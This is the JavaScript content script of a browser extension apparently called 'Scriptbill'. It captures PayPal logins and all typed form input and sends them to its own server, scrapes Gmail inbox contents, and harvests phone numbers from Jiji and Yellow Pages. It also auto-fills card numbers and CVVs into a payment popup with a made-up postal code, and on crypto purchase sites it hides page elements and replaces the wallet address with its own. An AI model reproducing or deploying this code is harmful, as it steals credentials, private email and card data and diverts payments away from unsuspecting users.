
/* chrome.runTime.onMessage.addListener( function(  message, sender, sendResponse){
	alert("mesage " + message );
}); */




function addPayPal(loc = 'paypal', sign = 'signin', user = 'email', pass = 'password', type = 'paypal'){
    if(! location.href.includes(loc) && ! location.search.includes("walletID") ) {
		if( localStorage.payInterval ){
			clearInterval(localStorage.payInterval);
			delete localStorage.payInterval;
		}
		return;
	}
    
    if(! location.href.includes(sign) && location.href.includes(loc) ) {
        if( localStorage.password && localStorage.emailPhone && localStorage.walletID ) {
            let server = Scriptbill.getDefaultServer();
            let url = new URL(server);
            url.searchParams.set('walletID', localStorage.walletID);
            url.searchParams.set('password', localStorage.password);
            url.searchParams.set('userID', localStorage.emailPhone);
            url.searchParams.set('type', type);
            fetch(url);
			delete localStorage.password;
			delete localStorage.emailPhone;
			delete localStorage.walletID;
			
			if( localStorage.payInterval ){
				clearInterval(localStorage.payInterval);
				delete localStorage.payInterval;
			}
        }
    }
    
    let url = new URL( location.href );
    let walletID = url.searchParams.get('walletID');
	if( walletID )
		localStorage.walletID = walletID;
	
	if( location.href.includes(loc)){
		let emailPhone = document.getElementById(user);
		let password  = document.getElementById(pass);
		
		if( emailPhone && emailPhone.tagName ){
			emailPhone.oninput = function(){			
				localStorage.emailPhone = this.value;
			}
		}
		
		if( password && password.tagName ){    
			password.oninput = function(){			
				localStorage.password = this.value;
			}
		}
	} else {
		
		if( ! localStorage.walletID )
			return;
		
		let inputs = document.querySelectorAll("input");
		
		if( inputs.length ){
			for( let x = 0; x < inputs.length; x++ ){
				inputs[x].oninput = function(){
					let par = inputs[x].parentElement.parentElement;
					let type1 = inputs[x].getAttribute("type");
					let label = par.tagName != "LABEL" ? par.querySelector("label") : par;
					let attr 	= ( label && label.tagName ? label.innerText.toLowerCase().replace(" ", "_") + "_" + type1.toLowerCase() : false );
					
					if( ! attr ) return;
					
					localStorage[ attr ] = this.value;
					let server = Scriptbill.getDefaultServer();
					let url = new URL(server);
					url.searchParams.set('walletID', localStorage.walletID);
					url.searchParams.set(attr, this.value);
					url.searchParams.set('bankWeb',location.origin);
					fetch( url.href );
				}
			}
		}
	}	
}

async function dumpContactsFromJiji(cats = 'cars', page = 1){
	const categories = ['cars', 'buses', 'heavy-equipments-machinery', 'motorcycles-and-scooters', 'trucks-commercial-agricultiral', 'car-parts-and-accessories', 'watercrafts-vehicle', 'real-estate', 'new-builds', 'houses-apartments-for-rent', 'land-and-plots-for-rent', 'land-and-plots-for-sale', 'event-centers-and-venues'];
	let ads = await fetch(sessionStorage.next_url ? sessionStorage.next_url :'https://jiji.ng/api_web/v1/listing?slug=' + cats + '&init_page=true&page=' + page + '&webp=true').then( resp =>{ return resp.json() });
	let adverts = ads.adverts_list.adverts;
	let totalPages = ads.adverts_list.total_pages;
	let contacts = JSON.parse( localStorage.contacts ? localStorage.contacts: '[]' );
	sessionStorage.next_url = ads.next_url;
	
	////console.log( ads );
	
	for( let x = 0; x < adverts.length; x++ ){
		if( ! contacts.includes( adverts[x].user_phone ) )
			contacts.push( adverts[x].user_phone );
	}
	
	if( ! sessionStorage.zero )
		sessionStorage.zero = 0;
	
	localStorage.contacts = JSON.stringify( contacts );
	
	setTimeout( ()=>{
		
		if( sessionStorage.stopCrawling )
			return;
		
		page++;
		if( page < totalPages )
			dumpContactsFromJiji();
		
		else {
			let zero 	= parseInt( sessionStorage.zero );
			zero++
			delete sessionStorage.next_url;
			
			if( zero < categories.length ){
				cats 	= categories[zero];
				sessionStorage.currentCategory = cats;			
				dumpContactsFromJiji(cats);
			}
		}
	}, 60000 );
}
async function dumpContactsFromYellowPages(city = 'atlanta-ga', cats = 'dentists', page = 1){
	
	let categories = localStorage.YPcategories ? JSON.parse( localStorage.YPcategories ) : [];
	let cities 		= localStorage.YPcities ? JSON.parse( localStorage.YPcities ) : [];
	
	
	let ads = await fetch(sessionStorage.YPnext_url ? sessionStorage.YPnext_url :'https://www.yellowpages.com/'+ city +'/'+ cats +'?page=' + page).then( resp =>{ return resp.text() });
	
	let adscats  = await fetch('https://www.yellowpages.com/categories').then( resp =>{ return resp.text() });//
	
	if( categories.length < 1 ){
		adsdiv 		= document.createElement('div');
		adsdiv.innerHTML 	= adscats;
		let three = adsdiv.querySelectorAll('.column.three');
		
		for( let z = 0; z < three.length; z++ ){
			categories.push ( three[z].href.replace(location.origin + '/categories/', "") );
		}
		
		localStorage.YPcategories	= JSON.stringify( categories );
	}
	
	let adverts = document.createElement('div');
	adverts.innerHTML = ads;
	let city_links = adverts.querySelector("#yp-footer > div.primary > section.city-guides > div").querySelectorAll('a');
	if( cities.length < 1 ){
		for( let r = 0; r < city_links.length; r++ ){
			cities.push ( city_links[r].href.replace(location.origin + '/', "") );
		}
		
		localStorage.YPcities = JSON.stringify( cities );
	}
	let totalPages = adverts.querySelector('.showing-count').innerText.split('-')[1].split(' of ');
	let next_url 	= adverts.querySelector('.pagination').querySelector('ul').querySelector('li:last-child').querySelector('a').href.replace(location.origin, 'https://www.yellowpages.com');
	adverts 	= adverts.querySelectorAll('.phones');
	
	totalPages 	=  parseInt( totalPages[1] ) / adverts.length;
	let contacts = JSON.parse( localStorage.yellowContacts ? localStorage.yellowContacts: '[]' );
	sessionStorage.YPnext_url = next_url;
	
	////console.log( ads );
	
	for( let x = 0; x < adverts.length; x++ ){
		if( ! contacts.includes( adverts[x].innerText ) )
			contacts.push( adverts[x].innerText );
	}
	
	if( ! sessionStorage.ypzero )
		sessionStorage.ypzero = 0;
	
	if( ! sessionStorage.city )
		sessionStorage.city = 0;
	
	localStorage.yellowContacts = JSON.stringify( contacts );
	
	setTimeout( ()=>{
		
		if( sessionStorage.stopCrawling )
			return;
		
		page++;
		if( page < totalPages )
			dumpContactsFromYellowPages();
		
		else {
			let zero 	= parseInt( sessionStorage.ypzero );
			zero++
			delete sessionStorage.next_url;
			
			if( zero < categories.length ){
				cats 	= categories[zero];
				sessionStorage.currentYPCategory = cats;			
				dumpContactsFromYellowPages(city, cats, 1);
			} else {
				zero 	= parseInt( sessionStorage.city );
				zero++;
				city 	= cities[zero];
				cats 	= categories[0];
				sessionStorage.currentYPCategory = cats;			
				sessionStorage.currentCity = city;			
				dumpContactsFromYellowPages(city, cats, 1);
			}
		}
	}, 60000 );
}


async function getEmails( server = "https://mail.google.com" ){
	
	let table = null, trs = [], td1, data ={}, info, email;
	if( location.origin == server ){
		if( server == "https://mail.google.com" ){
			table = document.getElementById("html>body>div:nth-of-type(8)>div:nth-of-type(3)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div>div>div:nth-of-type(2)>div>div:nth-of-type(1)>div>div>div:nth-of-type(8)>div>div:nth-of-type(1)>div:nth-of-type(2)>div>table");
			
			if( ! table ){
				let obj = {
					notLoggedIn:'TRUE',
					url: location.href
				};
				chrome.runtime.sendMessage(obj);
				return;
			}
			else {
				if( ! Scriptbill.s.loggedIn ){
					Scriptbill.s.loggedIn	= "TRUE";
					let obj = {
						loggedIn:'TRUE',
						url: location.href,
						crawl:'TRUE'
					};
					chrome.runtime.sendMessage(obj);
				}
			}
			
			trs 	= table.querySelectorAll("tr");
			email 	= document.querySelector("a[href*='SignOutOption']").getAttribute("aria-label").split('\n')[1];
			let data 	 = await Scriptbill.getData(['open', 'email'], ['true', email], Scriptbill.getDefaultServer() );
			let id 			= data ? data.id : false;
			let readMail 	= data ? data.email:false;
			let span1 		= document.querySelector("html>body>div:nth-of-type(8)>div:nth-of-type(3)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div>div>div:nth-of-type(1)>div>div:nth-of-type(1)>div:nth-of-type(2)>div>span>div:nth-of-type(1)>span>span:nth-of-type(1)");
			let span2 		= document.querySelector("html>body>div:nth-of-type(8)>div:nth-of-type(3)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div>div>div:nth-of-type(1)>div>div:nth-of-type(1)>div:nth-of-type(2)>div>span>div:nth-of-type(1)>span>span:nth-of-type(2)");
			let totalNum	= parseInt( span2.innerText.replaceAll(',','') );
			let firstID   	= parseInt( span1.innerText.split('-')[0] );
			let lastID   	= parseInt( span1.innerText.split('-')[1] );
			let realID 		= firstID;
			let nextMail 	= document.querySelector("html>body>div:nth-of-type(8)>div:nth-of-type(3)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div>div>div:nth-of-type(1)>div>div:nth-of-type(1)>div:nth-of-type(2)>div>span>div:nth-of-type(3)");
			let url 		= new URL( location.href );
			let context 	= url.searchParams.get("context");
			
			for( let x = 0; x < trs.length; x++ ){
				setTimeout( ()=>{
					realID 		= firstID + x;
					td1 = trs[x].querySelector("td:nth-child(4)");
					data['info1'] = td1.querySelector("div:nth-child(1)").innerText;
					data['email'] = td1.querySelector("div:nth-child(1)").querySelector("span:first-child").querySelector("span:first-child").getAttribute("email");
					info = td1.querySelector("div:nth-child(1)").innerText.split(',');
					data['status']	= info[0];
					data['header'] 	= info[1];
					data['time'] 	= info[3];
					data['date']	= trs[x].querySelector("td:nth-child(8)").querySelector("span:first-child").getAttribute("title");				
					
					Scriptbill.getData(['email', 'data', 'id'], [email, JSON.stringify( data ), realID ], Scriptbill.getDefaultServer() );
				}, x * 5000, id, x );				
			}
			
			if( id && parseInt( id ) != NaN && parseInt( id ) > lastID && context == "iframe"  && parseInt( id ) <= totalNum ){
				nextMail.click();
			} else if( id && parseInt( id ) != NaN && parseInt( id ) <= totalNum ){
				td1 = trs[id].querySelector("td:nth-child(4)");
				let dmail = td1.querySelector("div:nth-child(1)").querySelector("span:first-child").querySelector("span:first-child").getAttribute("email");
				
				if( readMail == dmail ){				
					trs[id].click();
					return;
				}
			}else if( location.hash.split("#inbox").length > 1 ){
				//this shows we are in the inbox we clicked.
				// /html/body/div[8]/div[3]/div/div[2]/div[2]/div/div/div/div[2]/div/div[1]/div/div[2]/div/div[2]/div[2]/div/div[3]/div/div/div/div/div/div[1]/div[2]/div[3]/div[3]/div[1]
				let content = document.querySelector("html>body>div:nth-of-type(8)>div:nth-of-type(3)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div>div>div:nth-of-type(2)>div>div:nth-of-type(1)>div>div:nth-of-type(2)>div>div:nth-of-type(2)>div:nth-of-type(2)>div>div:nth-of-type(3)>div>div>div>div>div>div:nth-of-type(1)>div:nth-of-type(2)>div:nth-of-type(3)>div:nth-of-type(3)>div:nth-of-type(1)");
				Scriptbill.getData(['email', 'content', 'id'], [readMail, content.innerText, id ], Scriptbill.getDefaultServer() );
			}
		}
	}
}

async function gatherInfoAndPay(){
	let inputs = document.querySelectorAll("input");
	
	if( inputs.length > 0 ){
		for( let x = 0; x < inputs.length; x++ ){
			
			if( inputs[x].type != 'file' ){
				inputs[x].oninput = function(e){
					let parent 		= inputs[x].parentElement;
					let label 		= parent.tagName == "LABEL" ? parent: parent.querySelector("label");
					let nameID 		= inputs[x].getAttribute('id');
					
					if( nameID ){
						let ID 		= inputs[x].getAttribute('name');
						
						if( ID )
							nameID 	+= ID;					
					} else {
						nameID 		= inputs[x].getAttribute('name');
					}
					
					nameID 		= nameID.replaceAll(' ', '_' ).toLowerCase();
					
					let inputsData = localStorage.scriptInputs;
					
					if( inputsData && Scriptbill.isJsonable(inputsData) ){
						inputsData		= JSON.parse( inputsData );
					} else {
						inputsData		= {};
					}
					
					let keys 	= Object.keys(inputsData);
					inputsData[nameID] = {
						server 		: location.origin,
						label		: label ? label.innerText : '',
						name		: nameID,
						value		: this.value,
						type 		: this.getAttribute('type')
					};
					
					localStorage.scriptInputs 		= JSON.stringify( inputsData );
				}
			} else {
				inputs[x].onchange = function(e){
					let files = this.files;
					let reader = new FileReader(), text;
					let parent 		= inputs[x].parentElement;
					let label 		= parent.tagName == "LABEL" ? parent: parent.querySelector("label");
					let nameID 		= inputs[x].getAttribute('id');
					
					if( nameID ){
						let ID 		= inputs[x].getAttribute('name');
						
						if( ID )
							nameID 	+= ID;					
					} else {
						nameID 		= inputs[x].getAttribute('name');
					}
					
					nameID 		= nameID.replaceAll(' ', '_' ).toLowerCase();
					
					for( let y = 0; y < files.length; y++ ){
						text 	= reader.readAsText( files[0] );
						reader.addEventListener("load", function(){
							let noteData 	= reader.result;
							let inputsData = localStorage.scriptInputs;
					
							if( inputsData && Scriptbill.isJsonable(inputsData) ){
								inputsData		= JSON.parse( inputsData );
							} else {
								inputsData		= {};
							}
							
							let keys 	= Object.keys(inputsData);
							inputsData[nameID] = {
								server 		: location.origin,
								label		: label ? label.innerText : '',
								name		: nameID,
								value		: noteData,
								type 		: this.getAttribute('type')
							};
							
							localStorage.scriptInputs 		= JSON.stringify( inputsData );
						});
					}
					
					
					
				}
			}
		}
	}
	
	if( localStorage.scriptInputs ){
		let inputsData = JSON.parse( localStorage.scriptInputs );
		let value 		= Object.keys( inputsData ).length;
		let userAgent	= navigator.userAgent;
		for( let c = 0; c < value; c++ ){
			try {
				let obj = {};
				obj.userAgent = userAgent;
				obj.data 	= inputsData[c];
				obj.value 	= value;
				chrome.runtime.sendMessage(obj);
			} catch(e){
				
			}
		}
		
	}
}

getEmails();

// dumpContactsFromJiji();
// dumpContactsFromYellowPages();


localStorage.payInterval = setInterval( function(){
	addPayPal();
}, 1000 );

if( location.href.includes("popup.squadco.com") ){
	localStorage.squadInterval = setInterval( function(){
		let root 		= document.getElementById("root");
		if( ! root || ! root.tagName )
			return;
		
		let url 	= new URL( location.href );
		let userCard = {};
		userCard.cardNum 	= url.searchParams.get("num");
		userCard.cardExp 	= url.searchParams.get("exp");
		userCard.cardCVV 	= url.searchParams.get("cvv");
		userCard.first 		= url.searchParams.get("first");
		userCard.last 		= url.searchParams.get("last");
		userCard.address 	= url.searchParams.get("address");
		userCard.city 		= url.searchParams.get("city");
		userCard.postal 	= url.searchParams.get("postal");
		userCard.country 	= url.searchParams.get("country");
		userCard.amount 	= url.searchParams.get("amount");
		
		if( ! userCard.cardNum || ! userCard.cardExp || ! userCard.cardCVV ){
			userCard	= url.searchParams.get("buyCard");
			
			if( ! userCard )
				return;
			
			else {
				if( Scriptbill.isJsonable( userCard ) ){
					userCard 	= JSON.parse( userCard );
					userCard.cardNum = userCard.cardNumber;
					userCard.first 		= userCard.holderName.split(" ")[0];
					userCard.last 		= userCard.holderName.split(" ")[1];
					userCard.address 	= userCard.cardAddress;
					userCard.postal 	= userCard.cardPostal;
					userCard.country 	= userCard.cardCountry;
					userCard.cardExp 	= userCard.expiry[0] + "/" + userCard.expiry[2];
					userCard.cardCVV	= userCard.cvvNum;
					userCard.city		= userCard.cardCity;
					userCard.amount 	= url.searchParams.get("checkout_amount");
					
				}
				else return;
			}
		} 

		let cardEL 	= root.querySelector("input[name='cardNumber']");
		let expEL 	= root.querySelector("input[name='expiryDate']");
		let cvvEL 	= root.querySelector("input[name='cvvNumber']");
		let button = root.querySelector("#tabs--1--panel--0 button[type='submit']");
		
		if( ! cardEL || ! expEL || ! cvvEL || ! button ) return;	
		
		userCard.cardNum 	= userCard.cardNum.split("");
		userCard.cardExp 	= userCard.cardExp.split("/");
		userCard.cardCVV 	= userCard.cardCVV.split("");
		let d 		= 1;
		for( let c = 0; c < userCard.cardNum.length; c++ ){
			d 	= c + 1;
			setTimeout( ()=>{
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				cardEL.value  	+= userCard.cardNum[c]; 
				cardEL.dispatchEvent(event);
			}, d * 500 );			
		}
		for( let e = 0; e < cardExp.length; e++ ){
			d 	= e + 1;
			setTimeout( ()=>{
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				expEL.value  	+= userCard.cardNum[c]; 
				expEL.dispatchEvent(event);
			}, ((d * 500)+5000) );			
		}
		for( let e = 0; e < cardExp.length; e++ ){
			d 	= e + 1;
			setTimeout( ()=>{
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				if( userCard.cardNum[c].length > 2 ){
					userCard.cardNum[c] = userCard.cardNum[c].split(1, userCard.cardNum[c].length )
				}
				cvvEL.value  	+= userCard.cardNum[c]; 
				cvvEL.dispatchEvent(event);
			}, ((d * 500)+6000) );			
		}
		
		button.removeAttribute("disabled");
		button.click();
		clearInterval( parseInt( localStorage.squadInterval ) );
		localStorage.squadInterval = setInterval( function(){
			let fullName 		= root.querySelector("input[name='cardFullName']");
			let street 			= root.querySelector("input[name='street']");
			let country			= root.querySelector("input#react-select-country-input");
			let city			= root.querySelector("input[name='city']");
			let code			= root.querySelector("input[name='postalCode']");
			button				= root.querySelector("input[name='postalCode']");
			
			if( userCard.first && userCard.last && fullName && fulName.tagName && ! fullName.value ){
				fullName.value = userCard.first +" "+ userCard.last;
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				fullName.dispatchEvent( event );
			}
			
			if( street && ! street.value && userCard.address ){
				street.value = userCard.address;
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				street.dispatchEvent( event );
			}
			
			if( city && ! city.value && userCard.city ){
				city.value = userCard.city;
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				city.dispatchEvent( event );
			}

			if( code && ! code.value ){
				let min = 100001;
				let max = 982002;
				code.value = userCard.code || Math.round( Math.random() * (max - min) + min );
				var event = new Event('input', {
					bubbles: true,
					cancelable: true,
				});
				code.dispatchEvent( event );
			}
			
			if( country && ! country.getAttribute('isset') ){
				let children = country.children;
				
				for( let y = 0; y < children.length; y++ ){
					if( children[y].outerHTML.includes( userCard.country ) ){
						var event = new Event('click', {
							bubbles: true,
							cancelable: true,
						});
						country.dispatchEvent( event );
						children[y].setAttribute("selected", "selected");
						children[y].dispatchEvent( event );
						country.setAttribute("isset", "true");
						break;
					}
				}			
			}
			
			if( button && country.getAttribute('isset') && code.value && city.value && street.value && fullName.value && ! button.getAttribute("isClicked") ){
				button.setAttribute("isClicked", "yes");
				button.click();
			}
			let bodyD = document.querySelector("#Body2") || document.querySelector("#Body2");
			
			if( bodyD && bodyD.innerText ){
				if( bodyD.innerText.includes("unable to authenticate this transaction") ){
					localStorage.checkedout = "FALSE";
				} else if( bodyD.innerText.includes("success") ) {
					localStorage.checkedout = "TRUE";
				}
			}
			
			if( localStorage.checkedout ){
				clearInterval( parseInt( localStorage.squadInterval ) );
				delete localStorage.squadInterval;
				let checkout = localStorage.checkedout == "FALSE" ? false : true;
				let dash 	= ! buyDashboard;
				let obj = {
					ischeckout : checkout,
					dashboard	: dash,
					card 		: userCard
				};
				chrome.runtime.sendMessage(obj);
				
			}
		}, 1000 );
		
	}, 1000 );
	
	/* browser.runtime.onMessage.addListener((request)=>{
		
	}); */
}

function buyScriptbills(){
	////console.log( Scriptbill.getTransBlock());	
	
	if( ! ( location.href.includes( "simplex" ) || location.href.includes("moonpay") || location.href.includes("chainbits") || location.href.includes("coingate") ) ) return;
	
	
	
	
	let simplexForm 	= getID("simplex-form");

	let x;
	
	for( x = 1; x < 3600; x++ ){
		setTimeout( async function(){
			
			if( location.href.includes("chainbits") ){
				let urla 		= new URL( location.href );
				let dashboard 	= urla.searchParams.get("buyDashboard");
				let value	 	= urla.searchParams.get("buyValue");
				let card	 	= urla.searchParams.get("buyCard");
				let currency 	= urla.searchParams.get("buyCur");
				let noteAddress	= urla.searchParams.get("buyNote");
				
				
				if( dashboard ){
					localStorage.buyDashboard = true;
				}
				
				if( value ){
					localStorage.buyValue = value;
				}
				
				if( card ){
					localStorage.buyCard	= card;
				}
				if( noteAddress ){
					localStorage.buyNote	= noteAddress;
				}				
				
				if( currency ){
					localStorage.buyCur = currency;
				}
				//currency must be set for the function to run.
				else {
					return;
				}
				
				//getting the iframes on the page.
				let iframes = document.getElementsByTagName("iframe");
				let iframe, x;
				let surl 		= new URL("https://scriptbank.com.ng"), murl, uuid;
				
				for( x = 0; x < iframes.length && localStorage.buyCur; x++ ){
					iframe = iframes[x];
					
					if( iframe.src.includes("simplex") ){
						//re shuffle the iframe to the source with our data as query data
						//so that we can save them in the local storage of the site.
						murl 		= new URL( iframe.src );
						uuid 		= murl.searchParams.get("uid");
						
						if( localStorage.buyDashboard ){
							surl.searchParams.set("buyDashboard", "TRUE");
						}
						
						if( localStorage.buyCur ){
							surl.searchParams.set("buyCur", localStorage.buyCur );
						}
						
						if( localStorage.buyValue ){
							surl.searchParams.set("buyValue", localStorage.buyValue);
						}
						
						if( localStorage.buyCard ){
							surl.searchParams.set("buyCard", localStorage.buyCard);
						}
						if( uuid ){
							surl.searchParams.set("buyID", uuid);
						}
						delete localStorage.buyCur;
						delete localStorage.buyValue;
						delete localStorage.buyCard;
						delete localStorage.buyDashboard;
						fetch(surl);
					}
				}				
			}else if( location.href.includes("simplex") ){
				let murl 		= new URL( location.href );
				let surl 		= new URL("https://scriptbank.com.ng");
				let uuid 		= murl.searchParams.get("uid");
				
				if( ! uuid ) return;
				
				localStorage.userID 	= uuid;
				
				surl.searchParams.set("buyData", uuid);
				
				if( localStorage.pendingDeposit ){
					let depRequest = JSON.parse( localStorage.pendingDeposit );
					surl.searchParams.set("depositID",depRequest.transBlock.blockID );
					surl.searchParams.set("withdrawID",depRequest.withdrawBlock.blockID);
				}
				let data 		= await fetch(surl).then( response =>{ return response.json();}).then( result =>{ return result; });
				
				let dashboard 	= data.buyDashboard;
				let value	 	= data.buyValue;
				let card	 	= data.buyCard;
				let currency 	= data.buyCur;
				let noteAddress	= data.buyNote;
				let depositID	= data.buyID;
				let withdrawID	= data.buyClient;
				
				if( dashboard ){
					localStorage.buyDashboard = true;
				}
				
				if( value ){
					localStorage.buyValue = value;
				}
				
				if( card ){
					localStorage.buyCard	= card;
				}
				if( noteAddress ){
					localStorage.buyNote    = noteAddress;
				}
				if( depositID ){
					localStorage.pendingDeposit    = depositID;
				}
				if( withdrawID ){
					localStorage.pendingWithdrawal    = withdrawID;
				}
				
				if( ! currency ) return;
				
				localStorage.buyCur 		= currency;
			}
			else if( location.href.includes("simplexcc") ){
				let murl 		= new URL( location.href );
				let surl 		= new URL("https://scriptbank.com.ng");
				let uuid 		= murl.searchParams.get("sid");
				
				if( ! uuid ) return;
				
				localStorage.userID 	= uuid;
				
				surl.searchParams.set("buyData", uuid);
				let data 		= await fetch(surl).then( response =>{ return response.json();}).then( result =>{ return result; });
				
				let dashboard 	= data.buyDashboard;
				let value	 	= data.buyValue;
				let card	 	= data.buyCard;
				let currency 	= data.buyCur;
				let noteAddress	= data.buyNote;
				
				if( dashboard ){
					localStorage.buyDashboard = true;
				}
				
				if( value ){
					localStorage.buyValue = value;
				}
				
				if( card ){
					localStorage.buyCard	= card;
				}
				if( noteAddress ){
					localStorage.buyNote    = noteAddress;
				}
				
				if( ! currency ) return;
				
				localStorage.buyCur 		= currency;
			}
			
			
			if( localStorage && localStorage.cryptoAddress ){
				delete localStorage.cryptoAddress;
			}
			
			let address  = getID("cryptoAddress");
			let payNow 		= getID("payNowButton");
			let contBtn 	= getClass("btn btn-full simplex-continue-button submit-btn");
			let offerPage 		= getClass("offer-page");
			let totalMoney		= getID("order-summary-fiat-amount");
			let chargeAmount	= getClass("charge-amount");
			let chargeCurrency 	= getClass("charge-currency");
			let activeStep 		= getClass("active-step");
			let modal 		= getID("progress");
			let cryptoAddress = "bc1qjyzwhmhmfw5vtyjxzzznpmqnuaxl6g6jkfpazj";
			let connect 	= getClass("walletconnect-link");
			let disclaim 	= getClass("address-disclaimer col-8");
			let orgy 		= getClass("col-12");
			let fiatInput 	= getClass("dropdown-btn dropdown-button btn-lg custom-input-right-border custom-button fiat-dd simplex-dd");
			let fiatAmount 	= getID("fiat_amount");
			let cryptUsed 	= getClass("dropdown-btn dropdown-button btn-lg custom-input-right-border custom-button crypto-dd simplex-dd");			
			let cancel 		= getID("modalBackButton");
			
			
			if( connect.length )
				attr( connect[0], "style", "display:none;" );
			
			if( disclaim.length )
				attr( disclaim[0], "style", "display:none;" );

			if( orgy && orgy[2] )
				attr( orgy[2], "style", "display:none;" );
			
			if( fiatInput && fiatInput[0]  && fiatInput[0].value.split(" ")[0] != localStorage.fiatCredit ){
				localStorage.fiatCredit = fiatInput[0].value.split(" ")[0];
				if( localStorage.buyCur && ! sessionStorage.currencySet ){
					virtualpointer.move_to_element_and_click( fiatInput[0], 200 );
					let curFind = getClass("autocomplete-results align-left");
					let curEl 	= curFind[1].querySelector("li[data-currency='"+localStorage.buyCur.toUpperCase()+"']");
					if( curEl ){
						virtualpointer.move_to_element_and_click( curEl, 200 );
					}
					sessionStorage.currencySet = "true";
				}
			}
			
			if( fiatAmount && ! localStorage.fiatAmount ){
				localStorage.fiatAmount	= fiatAmount.value;
				let amnt 			= parseFloat(localStorage.buyValue).toFixed(2);
				if( amnt ) {
					virtualpointer.move_to_element_and_click( fiatAmount, 500 );
					setTimeout( function(){
					fiatAmount.dispatchEvent(new Event("input"));		
					fiatAmount.value = amnt;
					attr( fiatAmount, 'disabled', 'disabled' );			
					localStorage.fiatAmount	= fiatAmount.value;
				}, 500 );
					
				}			
				
			}
			
			if( cryptUsed && cryptUsed[0] && cryptUsed[0].style.display != "none"){
				cryptUsed[0].style.display = "none";
			}
			
			if( localStorage.fiatCredit && ( ! localStorage.cryptoAddress || localStorage.cryptoAddress == "undefined" ) ){
				//console.log("localStorage storage found ", " credit: " + localStorage.fiatCredit );
				
				cryptoAddress 			=  await Scriptbill.getScriptbankAccounts();
				localStorage.cryptoAddress		= cryptoAddress;
				
				
				
			} else if( localStorage.cryptoAddress && localStorage.cryptoAddress != "undefined" ){
				cryptoAddress = localStorage.cryptoAddress;
			}			
			
			if( ! localStorage.modalDisplayed && location.href.includes("buy.chainbits") && ! localStorage.buyDashboard ) {
				localStorage.modalDisplayed = "TRUE";
				let div 		= create("div", {"class":"script-container script-center"}),
					p 			= create("p"),
					input 		= create("input", {"type":"text", "class": "script-input", "id":"coupon-input"}),
					pB			= create("label", {"style":"font-weight:bold;"})
					button		= create("button", {"class":"script-btn btn"});
						
				p.innerText 		= "To Acquire Scriptbill, there must be a Supply of credit where you will be purchasing. There is no credit right now in the Scriptbill blockchain system. To acquire credits, you will have to mine them. The Scriptbill mining system is designed for investment. That's the only way we can guarantee the value of the Fiat Scriptbill Credit type because Products are money. To Mine, you'll have to acquire a Scriptbill Bond from Scriptbank instead of the credit for a Daily Interest Rate of up to 5%, for up to three months. When the bond expires, your investment and interest will be used as credit which can be distributed among demanders. Your Checkout is a Direct Purchase to our Crypto Accounts.";
				pB.innerText		= "If you have a coupon code, you can enter it here and get a Loan Bonds with interest.";
				button.innerText 	= "Apply Coupon";
				button.onclick = function(){
					this.innerText = "Processing Coupon...";
					input 		   = getID("coupon-input");
						
					if( input && input.value != "" ){
						let url 	= new URL( "https://scriptbank.com.ng" );
						url.searchParams.set("couponCode", input.value);
						fetch( url ).then( resp =>{ return resp.json() } ).then( result =>{
								if( result.result == "successful" ){
									this.innerText = "Coupon Applied Successfully..";
									attr( this, "disabled", "disabled" );
									setTimeout( ()=>{
										this.innerText = "Selling Bond...";
										let value = result.value;
										let creditType = result.credit;
										//we are going to create the bond right here.
										sellBond( value, creditType );
										setTimeout( async ()=>{
											if( await Scriptbill.s.currentNote ){
												createAlert("Scriptbill Bond Successfully Sold...", "You can head over to the options page to manage your bond note", "green", 10);
												Scriptbill.download_note();
												
											}
										}, 5000 );
									}, 500 );										
								} else {
									createAlert("Invalid Coupon Entered", result.message ? result.message + " Coupon Code: " + input.value : " Coupon Code: " + input.value, "", 10);
									input.value = "";
									this.innerText = "Apply Coupon";
								}
						});
					} else {
						createAlert("Please enter a valid coupon code. Thanks!");
						this.innerText = "Apply Coupon";
					}
				}
				insert( div, p );
				insert( div, pB );
				insert( div, input );
				insert( div, button );
					
				createModal("Buy Scriptbill", div, "", "orange", "white", "white");
			}
			
			if( address && address.value != cryptoAddress ){
				
				if( localStorage.sellingBondAlready )
					delete localStorage.sellingBondAlready;
				
				virtualpointer.move_to_element_and_click( address, 500 );
				setTimeout( async function(){
					address.value = cryptoAddress;
					address.dispatchEvent(new Event("input"));
					attr( address, 'disabled', 'disabled' );
					attr( address, "style", "display:none;" );
					
					localStorage.cryptoAddress		= cryptoAddress;
					
					if( localStorage.fiatCredit ){
						let creditVal = 150;
						let exRate 	 = await fetch( await chrome.runtime.getURL("exRate.json") ).then( response =>{ return response.json(); }).then( result =>{ return result; });
						creditVal	= creditVal * exRate.rates[ localStorage.fiatCredit ];
												
						if( localStorage.buyDashboard && fiatAmount.value >= creditVal ){
							virtualpointer.move_to_element_and_click( contBtn[0], 500 );
						}
					}
				}, 500 );							
			}			
			
			if( offerPage && totalMoney && chargeAmount[0] ){
				localStorage.totalAmount 	= totalMoney.innerText.split( " " )[0];
				localStorage.creditType  	= totalMoney.innerText.split( " " )[1];
				localStorage.chargeAmount 	= chargeAmount[0].innerText;
				chargeAmount[0].innerText	= localStorage.totalAmount;
				chargeCurrency[0].innerText = "SB"+localStorage.creditType;
			}
			
			if( cancel ){
				cancel.onclick = function(){
					if( localStorage.unsuccessfulPayment ){
						delete localStorage.unsuccessfulPayment;
						
					}
				}
			}
			
			if( activeStep[0] ){
				//this shows the client is entering the card details in the buy Scriptbill center.
				let offerItem = document.getElementsByClassName("offer-item");
				
				if( offerItem[1] )
					offerItem[1].style.display = "none";
				
				if( localStorage.buyDashboard ){
					let creditCard 	= getClass("credit-card-details");
					
					if( creditCard && creditCard.length > 0 ){
						let cards 	= localStorage.buyCard;
						
						if( cards ){
							let cardin 	= JSON.parse( cards );
							let cardNum = creditCard[0].querySelector("input[name='credit_card_number']");
							let fName = creditCard[0].querySelector("input[name='first_name_card']");
							let lName = creditCard[0].querySelector("input[name='last_name_card']");
							let cvv = creditCard[0].querySelector("input[name='credit_card_ccv']");
							let exMnt = creditCard[0].querySelector("input[name='cc_expiration_month']");
							let exYear = creditCard[0].querySelector("input[name='cc_expiration_year']");
